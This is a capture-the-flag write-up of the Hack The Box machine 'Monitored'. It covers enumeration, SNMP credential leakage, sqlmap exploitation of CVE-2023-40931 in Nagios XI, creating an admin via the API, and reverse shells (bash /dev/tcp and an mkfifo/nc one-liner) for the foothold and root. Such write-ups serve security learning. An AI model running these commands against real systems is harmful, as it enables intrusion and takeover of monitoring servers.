@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/posts/2024/05/htb-monitored/" />
+
+
+    <title>
+        
+            HTB: Monitored
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: Monitored">
+<meta itemprop="description" content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access."><meta itemprop="datePublished" content="2024-05-09T21:41:07-05:00" />
+<meta itemprop="dateModified" content="2024-05-09T21:41:07-05:00" />
+<meta itemprop="wordCount" content="1473"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" /><meta name="twitter:title" content="HTB: Monitored"/>
+<meta name="twitter:description" content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access."/>
+
+
+
+    <meta property="og:title" content="HTB: Monitored" />
+<meta property="og:description" content="Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/posts/2024/05/htb-monitored/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-05-09T21:41:07-05:00" />
+<meta property="article:modified_time" content="2024-05-09T21:41:07-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-05-09 21:41:07 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="fr" href="https://scorpiosec.com/fr/posts/2024/05/htb-monitored/">fr</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+         | Also available in
+          
+              <a href="https://scorpiosec.com/fr/posts/2024/05/htb-monitored/"><span class="flag fi fi-fr"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/posts/2024/05/htb-monitored/">HTB: Monitored</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Monitored" target="_blank" >Monitored</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage <code>CVE-2023-40931</code> to  add a new admin account to the Nagios XI instance to grant us access. By executing a command in Nagios XI we gain our initial foothold to recover the user flag, and by manipulating some services we escalate our privileges to find the root flag.</p>
+<p>Target IP - <code>10.10.11.248</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Monitored 10.10.11.248
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-17 11:55 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.248
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.4.56
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://nagios.monitored.htb/
+</span></span><span style="display:flex;"><span>389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http Apache httpd 2.4.56 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_http-title: Nagios XI
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>nagios.monitored.htb/organizationName<span style="color:#f92672">=</span>Monitored/stateOrProvinceName<span style="color:#f92672">=</span>Dorset/countryName<span style="color:#f92672">=</span>UK
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-11T21:46:55
+</span></span><span style="display:flex;"><span>|_Not valid after:  2297-08-25T21:46:55
+</span></span><span style="display:flex;"><span>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.69 seconds
+</span></span></code></pre></div><p>Four open ports are found, 22 (SSH), 80 (HTTP with Apache), 389 (LDAP), 443 (HTTPS). We also get redirected to <code>nagios.monitored.htb/</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.248 monitored.htb nagios.monitored.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>Navigating to <code>https://nagios.monitored.htb/</code> we find a page leading us to a Nagios XI login page after we click on <code>Access Nagios XI</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/Nagios-XI.png" alt="Nagios XI"></p>
+<p>The url is <code>https://nagios.monitored.htb/nagiosxi/login.php</code>. We lack the credentials to login at this moment.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/Nagios-XI-login.png" alt="Nagios-login-XI"></p>
+<blockquote>
+<p>Nagios is an <strong>Open Source IT system monitoring tool</strong>. It was designed to run on the Linux operating system and can monitor devices running Linux, Windows and Unix OSes.</p>
+</blockquote>
+<p>We can do some directory enumeration with ffuf. Let&rsquo;s start with <code>https://nagios.monitored.htb/</code>.</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/fuzz.png" alt="Subdomain fuzzing"></p>
+<p>Visiting <code>https://nagios.monitored.htb/nagios</code> prompt us to log in but we don&rsquo;t have any credentials at this point.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-login.png" alt="Second Nagios Login form"></p>
+<p>Next we fuzz <code>https://nagios.monitored.htb/nagiosxi/</code> and multiple results are found.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/FUZZ&#39; -e .php,.html,.txt -ic -fc 404 -c
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/ffuf.png" alt="Ffuf directory enumeration"></p>
+<ul>
+<li>
+<p>Most of these endpoints redirect to the login page probably because we need to be authenticated in order to access them.</p>
+</li>
+<li>
+<p><code>/images</code> and <code>/api</code> return <code>Forbidden</code>.</p>
+</li>
+</ul>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/forbidden.png" alt="Forbidden page"></p>
+<ul>
+<li><code>/terminal</code> brings up a page titled <code>Shell In A Box</code> where we have access to a terminal in the browser to login into something.</li>
+</ul>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/terminal.png" alt="Nagios XI terminal endpoint"></p>
+<p>Going deeper, <code>/images</code> reveals more results but we don&rsquo;t have the permissions to access them.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/images/FUZZ&#39; -ic -c
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/images-fuzz.png" alt="Images endpoint enumeration"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/renewals.png" alt="Images endpoint enumeration - Renewal"></p>
+<p>Doing the same thing for <code>/api</code> we find <code>/includes</code> and <code>/v1</code>.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u &#39;https://nagios.monitored.htb/nagiosxi/api/FUZZ&#39; -ic -c
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/api.png" alt="api endpoint enumeration"></p>
+<p><code>includes</code> doesn&rsquo;t give anything useful but <code>v1</code> does returns a few interesting results.</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u &#39;https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ&#39; -ic -fs 32 -fc 403
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/v1-fuzz.png" alt="api endpoint enumeration - v1"></p>
+<p>Both <code>license</code> and <code>autheticate</code> return errors.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/license.png" alt="api endpoint enumeration - v1 - license"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/authenticate.png" alt="api endpoint enumeration - v1 - authenticate"></p>
+<p>At this point we have enumerated everything we discovered. So far we have found:</p>
+<ul>
+<li>
+<p>Three login pages:</p>
+<ul>
+<li><a href="https://nagios.monitored.htb/nagiosxi/" target="_blank" >https://nagios.monitored.htb/nagiosxi/</a>
+
+</li>
+<li><a href="https://nagios.monitored.htb/nagiosxi/terminal" target="_blank" >https://nagios.monitored.htb/nagiosxi/terminal</a>
+
+</li>
+<li><a href="https://nagios.monitored.htb/nagios" target="_blank" >https://nagios.monitored.htb/nagios</a>
+
+</li>
+</ul>
+</li>
+<li>
+<p>An authentication endpoint at <a href="https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" target="_blank" >https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</a>
+
+</p>
+</li>
+</ul>
+<p>It is clear that we need some credentials to access the target system.</p>
+<blockquote>
+<p>Although UDP scans are rarely needed in CTFs, we should be as thorough as possible with our scanning. I scratched my head for a long time because I forgot about UDP scans.</p>
+</blockquote>
+<p>Let&rsquo;s try a UDP scan.</p>
+<pre tabindex="0"><code>sudo nmap -sU -sC -sV -vv 10.10.11.248
+</code></pre><blockquote>
+<p>This command will produce a lot of output and keep in mind that UDP scan are usually slower.</p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/udp-scan.png" alt="nmap UDP scan"></p>
+<p>Four ports will be discovered:</p>
+<ul>
+<li>68 - DHCP</li>
+<li>123 - NTP</li>
+<li>161 - SNMPv1</li>
+<li>162 - SNMPv3</li>
+</ul>
+<p>The most likely way to exploitation is SNMP. We can use <code>snmpwalk</code> to enumerate the service. We note that two versions of SNMP are used here, we will specify <code>SNMP V1</code> since it&rsquo;s less secure.</p>
+<blockquote>
+<p>The command below creates a lot of output on the terminal so I sent it to a file.</p>
+</blockquote>
+<pre tabindex="0"><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
+</code></pre><p>Going over the output I find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/creds-snmp.png" alt="SNMP potential credentials"></p>
+<p>The credentials did not work on <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> and we get the message that this user account is either disabled or non-existent at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-login-attempt.png" alt="NagiosXI login attempt failed"></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>At <code>https://nagios.monitored.htb/nagios</code> we are able to login. On that page we see a PID and the software version. Trying to reuse the cookie value from this page on <code>/nagiosxi</code> also fails.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-core.png" alt="NagiosXI login attempt successful"></p>
+<p>Searching for vulnerabilities for that specific software version we end finding <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/" target="_blank" >three CVEs</a>
+
+. They all allow users, with various levels of privileges, to access database fields via SQL injections.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-vulns.png" alt="NagiosXI vulnerabilities"></p>
+<p>We find a good explanation for the vulnerability in the post.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png" alt="CVE-2023-40931-EXPLAINED"></p>
+<p>We recall that back on the <code>/api/v1/authenticate</code> we saw the message <code>You can only use POST with authenticate.</code></p>
+<ol>
+<li>We send a POST request to that endpoint with the credentials of the user and receive a token</li>
+</ol>
+<pre tabindex="0"><code>curl -k -L -X POST &#34;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#34; -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/token-retrieval.png" alt="Token retrieval"></p>
+<ol start="2">
+<li>We use this token to launch an SQL injection</li>
+</ol>
+<pre tabindex="0"><code>sqlmap -u &#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae&#34; -p id --level 5 --risk 3 --dump 
+</code></pre><p>Once you see <code>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code> enter <code>N</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/sqlmap.png" alt="SQLmap command"></p>
+<p>SQLmap will start dumping all the tables of the database on the terminal but we can inspect the tables we are interested in by going to <code>/home/&lt;YOUR_USERNAME&gt;/.local/share/sqlmap/output/nagios.monitored.htb/dump/</code>. We know that the exploit is related to the tables <code>xi_session</code> and <code>xi_users</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/tables-dumped.png" alt="SQLmap tables dump"></p>
+<p>You can also scroll through the output on the terminal and find the <code>xi_users</code> table dump. We find the API key for the <code>Nagios Administrator</code> user <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/API-key.png" alt="API key found"></p>
+<blockquote>
+<p>Passwords hashes are also present in the dump but we are unable to crack them.</p>
+</blockquote>
+<p>Still we don&rsquo;t have any valid credentials to login into Nagios XI and there is no way to sign up. Our only option is to find how to add a new account.</p>
+<p>After some research we find how to add new users via the API <a href="https://support.nagios.com/forum/viewtopic.php?t=42923" target="_blank" >here</a>
+
+ and on <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502" target="_blank" >this</a>
+
+ page we also find that we can add an admin account by using the <code>auth_level</code> parameter.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-api.png" alt="NagiosXI add users via API"></p>
+<p>The command below is used to create a new admin user.  The <code>username</code>, <code>email</code>, <code>name</code>, and <code>password</code> fields are required.</p>
+<pre tabindex="0"><code>curl -k &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&#34; -d &#34;username=adminsec&amp;password=password123&amp;name=kscorpio&amp;email=kscorpio@monitored.htb&amp;auth_level=admin&#34;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/user-created.png" alt="User added via API successfully"></p>
+<p>With the account newly created we are able to log into Nagios XI at <code>https://nagios.monitored.htb/nagiosxi/</code></p>
+<blockquote>
+<p>You will be asked to change the password once you login.</p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-login.png" alt="NagiosXI login success"></p>
+<p>On the Dashboard, hover on the <code>Configure</code> menu and select <code>Core Config Manager</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-config.png" alt="NagiosXI config"></p>
+<p>Select <code>Commands</code> and then <code>Add New</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/config-cmd.png" alt="Core Config Manager"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/new-cmd.png" alt="Add new command"></p>
+<p>Add a reverse shell command and save it.  For example: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP_Address&gt;/&lt;Port&gt; 0&gt;&amp;1'</code></p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/rev-shell-cmd.png" alt="Reverse shell command"></p>
+<p>You also have to click <code>Apply Configuration</code> for the new command to be listed. Now you should see <code>149 Commands</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/apply-config.png" alt="Apply configuration"></p>
+<p>Let&rsquo;s start a listener on the port specified in our command.</p>
+<p>To run the command Go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/localhost.png" alt="Configuration - localhost"></p>
+<p>Under <code>Check command</code>, select your command and click <code>Run Check Commad</code> and you will get a connection on your listener.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-shell.png" alt="Initial Foothold"></p>
+<p>You can get the user flag at <code>/home/nagios/user.txt</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/user-flag.png" alt="User flag"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Running <code>sudo -l</code> we discover that the user can manipulate two services <code>nagios</code> and <code>npcd</code> in addition to running various scripts.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/sudo-l.png" alt="sudo -l command"></p>
+<blockquote>
+<p>The npcd service in Nagios is a <strong>daemon</strong> responsible for processing <strong>performance data</strong> received from Nagios checks.</p>
+</blockquote>
+<p>Using the <code>find</code> command we get the exact locations of <code>nagios</code> and <code>npcd</code>.</p>
+<pre tabindex="0"><code>find / -name nagios 2&gt; /dev/null
+
+find / -name npcd 2&gt; /dev/null
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/services-location.png" alt="services locations"></p>
+<p>We also check the permissions of the binaries and we notice that we have write permission for  <code>npcd</code>. We can edit the file content and replace it with a malicious command to get a shell.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/binaries-perms.png" alt="Binaries permissions"></p>
+<ol>
+<li>Stop the service</li>
+</ol>
+<pre tabindex="0"><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
+</code></pre><ol start="2">
+<li>Edit <code>npcd</code></li>
+</ol>
+<pre tabindex="0"><code>echo &#39;#!/bin/bash&#39; &gt; /usr/local/nagios/bin/npcd
+
+echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 5555 &gt;/tmp/f&#39; &gt;&gt; /usr/local/nagios/bin/npcd
+</code></pre><ol start="3">
+<li>Start a listener and start the <code>npcd</code> service using the script.</li>
+</ol>
+<pre tabindex="0"><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
+</code></pre><p>We get a root shell on our listener and we can read the root flag at <code>/root/root.txt</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Monitored/root-flag.png" alt="Root flag"></p>
+<p>Monitored was a fun challenge forcing me to up my scanning and enumeration game, this was the first time I had to use a UDP scan for a CTF. I hope this write up was helpful! If you have any questions you can leave a comment (which requires a Github account) or you can reach out on Twitter at <a href="https://twitter.com/_KScorpio" target="_blank" >_KScorpio</a>
+
+.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1473 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-05-09 21:41
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
